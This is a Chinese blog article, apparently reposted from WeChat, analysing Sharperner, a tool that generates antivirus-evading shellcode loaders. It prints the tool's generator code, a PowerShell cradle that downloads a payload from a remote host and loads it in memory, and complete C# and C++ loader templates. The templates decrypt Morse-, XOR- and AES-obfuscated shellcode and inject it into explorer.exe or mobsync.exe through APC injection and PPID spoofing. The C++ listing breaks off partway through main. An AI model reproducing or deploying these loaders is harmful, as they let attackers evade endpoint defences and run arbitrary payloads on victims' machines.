> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ch4n1oCg5StCP4uV0CFBLw)

**前言**

 **多看看别人的工具，自己也就会写了。（手动狗头）**

Sharperner 是一款 C# 编写的自动化免杀工具，用来生成免杀的 exe 文件或者 C++ 的 loader，在 antiscan.me 上为全绿，效果可见一斑。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9N1ZDBTTqhWNF87wlVKEJ8jO0797cgic1crPE0d6icm4BlYBmIkOQCIcEg/640?wx_fmt=png)

其官方地址为：https://github.com/aniqfakhrul/Sharperner

其文件结构如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9NBTa0ibTiaHibfa7sAQgXRYly2f9KLlLC8fDkCPOudAYqRicCRicwBN1KsqQ/640?wx_fmt=png)

按照其官方介绍来看，其支持 XOR 和 AES 加密。

其 C# 版 exe 使用的技术如下：

*   AES + XOR 加密的 shellcode
    
*   随机函数名
    
*   APC 进程注入 (explorer.exe) 随机函数名
    
*   随机生成的 AES 密钥和 iv
    
*   最终的 Shellcode、Key 和 IV 被翻译成莫尔斯电码 :)
    

普通版技术如下：

*   Process Hollowing
    

*   PPID Spoofing
    
*   Random generated AES key and iv
    
*   Final Shellcode, Key and IV are translated to morse code :)
    

其使用方法如下：  

```
/file       B64,hex,raw shellcode
/type       cs,cpp
/out        Output file Location (Optional)

Example:
Sharperner.exe /file:file.txt /type:cpp
Sharperner.exe /file:file.txt /out:payload.exe
```

  
另外作者还给出了优先加载方式 (国内不适用，你调用 PS 太麻烦)

```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[TotallyNotMal.Program]::Main()
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9NqIOsWUqf7xj61vQZ8DqzMoa586syWf2W9NwlS9XW1M6p7rYsPjjcSg/640?wx_fmt=png)

下面我们来简单的分析一下其代码实现。为了方便，我们首先定位到 tempFile 删除的代码，然后将其注释：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9NYy1M4tqtO2qMtLDGbRq2bKn1UgLpQociadnGyVWwPqiarqGzGpKOMrrg/640?wx_fmt=png)

其模板文件是存在于 templates 也可自行查看，二者选一即可。我们首先来看 C# 的。

首先是判断是否为 C#，如果是则进行方法名随机化、字符串随机化、模板填充的操作：  

```
if (dropperFormat == "cs")
                {
                    //https://stackoverflow.com/questions/5036590/how-to-retrieve-certificates-from-a-pfx-file-with-c

                    //Console.WriteLine($"XOR encrypted text: {xorAesEncStringB64}");

                    //decrypt it back

                    //byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xorAesEncStringB64), xorKey);

                    //string sh3Llc0d3 = DecryptStringFromBytes(aesEncrypted, key, iv);

                    //Console.WriteLine($"XOR decrypted text: {sh3Llc0d3}");

                    // Open template file
                    var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();

                    var parentDir = directory.FullName;

                    var templateFile = Path.Combine(parentDir, @"templates\template.cs");
                    
                    var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");

                    string templateFileContent = "";

                    // read all content
                    if (!File.Exists(templateFile)) //if file exists
                    {
                        Console.WriteLine("[!] File does not exists in local, fetching online...");
                        ServicePointManager.Expect100Continue = true;
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                        WebClient client = new WebClient();
                        try
                        {
                            templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/Sharperner/main/templates/template.cs");
                        }
                        catch
                        {
                            Console.WriteLine("[!] No internet connection");
                            Environment.Exit(0);
                        }
                    }
                    else
                    {
                        templateFileContent = File.ReadAllText(templateFile);
                    }

                    try
                    {
                        // randomize method names
                        var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
                        var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
                        Regex rg = new Regex(pattern);
                        MatchCollection methods = rg.Matches(templateFileContent);
                        foreach (var method in methods)
                        {
                            if (!method.ToString().Contains("Main"))
                            {
                                var methodName = Regex.Match(method.ToString(), methodNamesPattern);
                                templateFileContent = templateFileContent.Replace(methodName.ToString(), GenerateRandomString());
                            }

                        }

                        //randomize variable names
                        string[] variableNames = { "xoredAesB64", "xorKey", "aE5k3y", "aE5Iv", "aesEncrypted", "sh3Llc0d3", "lpNumberOfBytesWritten", "processInfo",
                                                    "pHandle", "rMemAddress", "tHandle", "ptr", "theKey", "mixed", "input", "theKeystring", "cipherText", "rawKey", "rawIV", "rijAlg", "decryptor", 
                                                    "msDecrypt", "csDecrypt", "srDecrypt", "plaintext", "cipherData", "decryptedData", "ms", "cs", "alg", "MorseForFun","startInfo","procInfo", "binaryPath",
                                                    "random", "aes_key", "aes_iv", "stringBuilder"};

                        foreach (string variableName in variableNames)
                        {
                            templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
                        }

                        // replace in template file
                        templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);

                    }
```

然后调用 csc 文件，进行文件编译  

```
string strCmd = $"/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{outputFile} {tempFile}";
                    try
                    {
                        Process process = new Process();

                        // Stop the process from opening a new window
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.CreateNoWindow = true;

                        // Setup executable and parameters
                        process.StartInfo.FileName = @"CMD.exe";
                        process.StartInfo.Arguments = strCmd;

                        // Go
                        process.Start();

                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                    }
```

然后休眠、删除模板文件

```
Thread.Sleep(1000);

                    File.Delete(tempFile);
```

其 shellcode 加载并无太多的新颖技术，从 API 的导入我们可以看到就是一个基本的 APC 注入

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9NmbgJzEhtaHcr4b5RHfMbwibT7GCkTVVdNn7qJQq0JwiaJ6yIyicJ5tnrw/640?wx_fmt=png)

其他的都是一些 shellcode 的解密、加载了  

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9NLVoORFRdibFB1O5rpQJZdOZ3vqQMXITKBQtkwwMLg69Tzic3zzVvIzRQ/640?wx_fmt=png)

比较新颖的可能即使摩尔斯的利用：

```
public static void InitializeDictionary()
            {
                _morseAlphabetDictionary = new Dictionary<char, string>()
                                   {
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
                                   };
            }
```

通过对文件内容的输出可以得到最后的模板内容：

```
using System;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace TotallyNotMal
{
    public class Program
    {
        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInherigjalukcf, uint dwProcessId);

        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint wlwtlwokvm);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInherigjalukcf, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInherigjalukcfs, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        //internal struct STARTUPINFO
        public struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        public class juwvqfghcab
        {
            private static Dictionary<char, string> _morseAlphabetDictionary;

            public static void vvgkjshs()
            {
                _morseAlphabetDictionary = new Dictionary<char, string>()
                                   {
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
                                   };
            }

            public static string jehdmpyqxinn(string dltnsdbuvig)
            {
                StringBuilder sdratvpuxveb = new StringBuilder();

                string[] codes = dltnsdbuvig.Split(' ');

                foreach (var code in codes)
                {
                    foreach (char keyVar in _morseAlphabetDictionary.Keys)
                    {
                        if (_morseAlphabetDictionary[keyVar] == code)
                        {
                            sdratvpuxveb.Append(keyVar);
                            break;
                        }
                    }
                }

                return sdratvpuxveb.ToString();
            }
        }

        public static PROCESS_INFORMATION yorebdvgh(string toybpdhqpno)
        {
            uint flags = 0x00000004;

            STARTUPINFO doahhsji = new STARTUPINFO();
            PROCESS_INFORMATION lwgsuqrawjlnn = new PROCESS_INFORMATION();
            CreateProcess((IntPtr)0, toybpdhqpno, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref doahhsji, out lwgsuqrawjlnn);

            return lwgsuqrawjlnn;
        }

        private static Random gahtrlsqw = new Random();
        public static string qmmbwehlk(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[gahtrlsqw.Next(s.Length)]).ToArray());
        }

        private static byte[] tuevqhrc(byte[] dltnsdbuvig, string ihjatewihoxuestring)
        {
            byte[] ihjatewihoxue = Encoding.UTF8.GetBytes(ihjatewihoxuestring);
            byte[] ahhxolrdxgwtg = new byte[dltnsdbuvig.Length];
            for (int i = 0; i < dltnsdbuvig.Length; i++)
            {
                ahhxolrdxgwtg[i] = (byte)(dltnsdbuvig[i] ^ ihjatewihoxue[i % ihjatewihoxue.Length]);
            }
            return ahhxolrdxgwtg;
        }

        //https://raw.githubusercontent.com/smokeme/payloadGenerator/main/xor/template
        public static string gpqmovrrfqev(byte[] lbesdfjd, byte[] ywlevtjb, byte[] sflyqhno)
        {
            // Check arguments.
            if (lbesdfjd == null || lbesdfjd.Length <= 0)
                throw new ArgumentNullException("lbesdfjd");
            if (ywlevtjb == null || ywlevtjb.Length <= 0)
                throw new ArgumentNullException("Key");
            if (sflyqhno == null || sflyqhno.Length <= 0)
                throw new ArgumentNullException("Key");

            // Declare the string used to hold
            // the decrypted text.
            string gdooinulaingqi = null;

            // Create an RijndaelManaged object
            // with the specified key and IV.
            using (RijndaelManaged gxejwedasj = new RijndaelManaged())
            {
                gxejwedasj.Key = ywlevtjb;
                gxejwedasj.IV = sflyqhno;

                // Create a decrytor to perform the stream transform.
                ICryptoTransform avlsfgik = gxejwedasj.CreateDecryptor(gxejwedasj.Key, gxejwedasj.IV);

                // Create the strearlfnvkems used for decryption.
                using (MemoryStream xvxqjqboljvenv = new MemoryStream(lbesdfjd))
                {
                    using (CryptoStream expagaub = new CryptoStream(xvxqjqboljvenv, avlsfgik, CryptoStreamMode.Read))
                    {
                        using (StreamReader bavtrskxcrkkam = new StreamReader(expagaub))
                        {

                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            gdooinulaingqi = bavtrskxcrkkam.ReadToEnd();
                        }
                    }
                }

            }

            return gdooinulaingqi;

        }

            //https://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C
            public static byte[] cyqqyoclpw(byte[] vcuypjthv, string qdvongfppnpbgr, string rtfnuhseqj)
        {

            MemoryStream rlfnvkems = new MemoryStream();

            Rijndael tppqiubobkvc = Rijndael.Create();

            tppqiubobkvc.Key = Convert.FromBase64String(qdvongfppnpbgr);
            tppqiubobkvc.IV = Convert.FromBase64String(rtfnuhseqj);

            CryptoStream xuipbwpmvsvj = new CryptoStream(rlfnvkems,
                tppqiubobkvc.CreateDecryptor(), CryptoStreamMode.Write);

            xuipbwpmvsvj.Write(vcuypjthv, 0, vcuypjthv.Length);

            xuipbwpmvsvj.Close();

            byte[] ywbvkrelptdl = rlfnvkems.ToArray();

            return ywbvkrelptdl;
        }

        public static void Main()
        {

            string kmekvnsk = "^-.. .-.. ^..- .--- ..... - --. ^.-. ^... ^... ^..- ^.-. ^-.-. ..- ^... / ^.--- --.. -- ^.-.. ^..- ^-... -.-. ^--.. ^.-. ^..- ---.. ^..- ^.--. ^.--. ...- ^-- ^...- -... ^. .. ^... .... ^-- ---.. ^--.. ^...- .- --- ^... ^-.. ^...- ^--. ^... ^-..- ... .-.. ^... ...- ^.^ ^.-- ..- ^...- ^-- -..- -.... .-- ^..-. ^.^ ^--.. .-. ^... ..... ^-.. --.- ^-..- ----- ^-- ^-..- ^.- ^.-- ^-- .--- .... ^... ... -.... .--- / .--- ----- ..... ^-. ^.-. . ^--.- ^-.-. ^-- ^.... ^-.. .. -.. -- .. .--. ^-.-- -.... ... ^.-. ^.--- .--. .... -- ...- .-.. .... ^.--. -.- ..- ..--- ....- ..... ^.-. ...-- ^... --. ..-. -.... ..- ^.... ^. .---- - .--. ^.... ^-..- ...- -- .-- ^.--- -.-- . ----- .-. ^--. ^.--. ^-.-. .... -.-. ....- .--- ^-. ^-.-- ^-.-. -... -.... ... ..--- --- ^.-- .-.. ^-... -... ----- ^--.. ...-- ^.- ..... ^.^ --.. ^... ^--.. ^.--. -... -... --.. ..... ^.. ^--- -.. .-. ^--. ^... ^.-.. --- ..-. ^-.-- ^.--. .- -..- --. .-- -.. ^- --.- ^.- ^.-- ^.-- ^. ----. ^--.- --. ^. ^--. ....- - - ----- - --. ^-... ^--.. ----. ^.-. ^- ----. ^- ^.-.. ^-. --... ^..-. ^. -.. .-. .. .... -.- ^... ^.-.. ..... ^--. ....- ..--- -.-- ^--. ^-. .-.. -.... ^. -.-- ....- --.. -.-- ^. ^. ^--.- ^.-.. ^..- -.-- ^.... ^.. ...-- .-.. - ^-.-. ----- .. ^.--. ....- --.. ^... ^..-. ^.--- .. - .- / ^.--. ^- ^-... ^--.. -.-- - -... .--. --... ^--- ...-- .... .---- --. ^. ^-... .. ..-. ^..-. ^-... ..--- -.. -- ^.-. -- .... ^--- ^.-- ..... ^-.-. ^.-- . ^--. ^.-.. ..--- ...-- ^.. -.-- ^...- / -.-. .... ^.^ ^-..- - -..- .- .-- --... .- ^..-. -.-- ^.. ^--.- -... -.-- ^... ^-.. .... ..- .-- ^.^ ...-- ^... -..- ----- ^-.- ^.-.. ---.. ^.- ^--.. -..- --. --. ^--.. ...-- --- ^.--. .-.. -.-- ----. ^.- ^..-. -.. -... ^. .--. ....- ^--.- ^--.. --- ^--.- ^.--. ^.-. .-- ^--. ^-.. ^... ..-. / .-.. -.... ----. ^--- ...-- ^..- ^-... ^.^ - ^--.. -... ---.. ^--.- ^-.-- ^-.-- ^--.- ^-..- ..-. ^--. ..... ----. ^--.- ";
            string oapyyweflctgg = "^.--- -. ^.^ ^..-. ^-.. ^-. ^- ^..^ -.. ....- -.. ..... - ..- ^.--- ^--.- -.- -.- ";
            string sefyhdafpr = "-.- ..- ^--. -- ^-.-- .... ...- ^.^ --... ----. ^.... ^-- ----- ^.... ^..-. ^- -.-. .-.. ^.- .... ^--.- ^--. ..- ^...- ..- .-.. -.-. -..- ^. ^-- ----- ^--. ^--.. ^-. .... .--- .. -.-. ^-... ^..-. -... ^--.. ....- ...^- ";
            string ccrhvqwsctc = ".---- / ^--. ^.... ^-... -.-. ^--. -.. ^..-. ^-. ^.-.. -. ^--.. - ^-.-- ..... -.- .--- ----. ^.-- ... --. ...^- ...^- ";

            byte[] lfpnlhsj = new byte[] { };

            juwvqfghcab.vvgkjshs();

            kmekvnsk = juwvqfghcab.jehdmpyqxinn(kmekvnsk);
            sefyhdafpr = juwvqfghcab.jehdmpyqxinn(sefyhdafpr);
            ccrhvqwsctc = juwvqfghcab.jehdmpyqxinn(ccrhvqwsctc);
            oapyyweflctgg = juwvqfghcab.jehdmpyqxinn(oapyyweflctgg);

            byte[] qqcjvandvd = tuevqhrc(Convert.FromBase64String(kmekvnsk), oapyyweflctgg);

            //Console.WriteLine("After XOR DEc: " + Encoding.UTF8.GetString(qqcjvandvd));

            lfpnlhsj = cyqqyoclpw(qqcjvandvd, sefyhdafpr, ccrhvqwsctc);

            //Console.WriteLine("After AES DEc: " + Encoding.UTF8.GetString(lfpnlhsj));

            //lfpnlhsj = Convert.FromBase64String(gpqmovrrfqev(qqcjvandvd, key, iv));

            //var decrypted = gpqmovrrfqev(tuevqhrc(Convert.FromBase64String(xorAesEncStringB64), oapyyweflctgg),key,iv);

            // Console.WriteLine($"XOR decrypted text: {shellcode}");

            //shellcode = Convert.FromBase64String(b64);

            uint wlwtlwokvm = 0;

            PROCESS_INFORMATION ppunifsd = yorebdvgh("C:/Windows/explorer.exe");

            IntPtr corxbgcfd = OpenProcess((uint)ProcessAccessRights.All, false, (uint)ppunifsd.dwProcessId);

            IntPtr ljkrlfshxyk = VirtualAllocEx(corxbgcfd, IntPtr.Zero, (uint)lfpnlhsj.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);

            if (WriteProcessMemory(corxbgcfd, ljkrlfshxyk, lfpnlhsj, (uint)lfpnlhsj.Length, ref wlwtlwokvm))
            {

                IntPtr gjalukcf = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)ppunifsd.dwThreadId);

                IntPtr nodgisyse = QueueUserAPC(ljkrlfshxyk, gjalukcf, IntPtr.Zero);

                ResumeThread(gjalukcf);

            }
            bool hOpenProcessClose = CloseHandle(corxbgcfd);
        }
    }


}
```

CPP 的则如下：

```
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"
#include <string>
#include <map>
#include <sstream>

using namespace std;

map< char, string > mxmqrswkg =
{
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
};

void wwygarpdv(std::string const& str, const char boveqcxond,
    std::vector<std::string>& out)
{
    // construct a stream from the string
    std::stringstream ss(str);

    std::string s;
    while (std::getline(ss, s, boveqcxond)) {
        out.push_back(s);
    }
}

string idwdcbsjt(string gnjtbnfmobyh)
{
    string rwwawoxrp;

    //morse to ascii
    std::vector<std::string> xdvjfwghh;
    wwygarpdv(gnjtbnfmobyh, ' ', xdvjfwghh);
    for (int s = 0; s < xdvjfwghh.size(); s++) {
        for (auto it = mxmqrswkg.rbegin(); it != mxmqrswkg.rend(); it++) {
            if (xdvjfwghh[s] == it->second)
            {
                rwwawoxrp.push_back(it->first);
            }
        }
    }
    return rwwawoxrp;
}

// This is just directly stolen from ired.team
DWORD jdmalejrndjw() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

//reffered to alaris
void ddrvwpki(std::vector<byte> nxllkgwilgr)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD cvhmsvnfo;
    DWORD kqcbjtqx;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 dpjcmtmeoysv = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dpjcmtmeoysv, sizeof(dpjcmtmeoysv), NULL, NULL);

    // Mask the PPID to that of explorer.exe
    HANDLE youhblbseh = OpenProcess(PROCESS_ALL_ACCESS, false, jdmalejrndjw());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &youhblbseh, sizeof(HANDLE), NULL, NULL);

    LPCWSTR fopvuyhunmwy = L"C:\\Windows\\System32\\mobsync.exe";

    if (!CreateProcess(
        fopvuyhunmwy,                   // LPCWSTR Command (Binary to Execute)
        NULL,                           // Command line
        NULL,                           // Process handle not inheritable
        NULL,                           // Thread handle not inheritable
        FALSE,                          // Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,     // Creation Flags
        NULL,                           // Use parent's environment block
        NULL,                           // Use parent's starting directory
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi                                     // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "whoops " << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1400);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T hqvxeqjpqxhucp = nxllkgwilgr.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&hqvxeqjpqxhucp, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, nxllkgwilgr.data(), nxllkgwilgr.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    // Overwrite shellcode with null bytes
    Sleep(9999);
    uint8_t ffdnyitmqkf[500];
    NtWriteVirtualMemory(hProcess, mem, ffdnyitmqkf, sizeof(ffdnyitmqkf), 0);
}
int main()
{
    //implement privilege escalation here
    //https://github.com/KooroshRZ/Windows-DLL-Injector/blob/61f30f3a9750600d09a19761515892e4582ec434/Injector/src

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

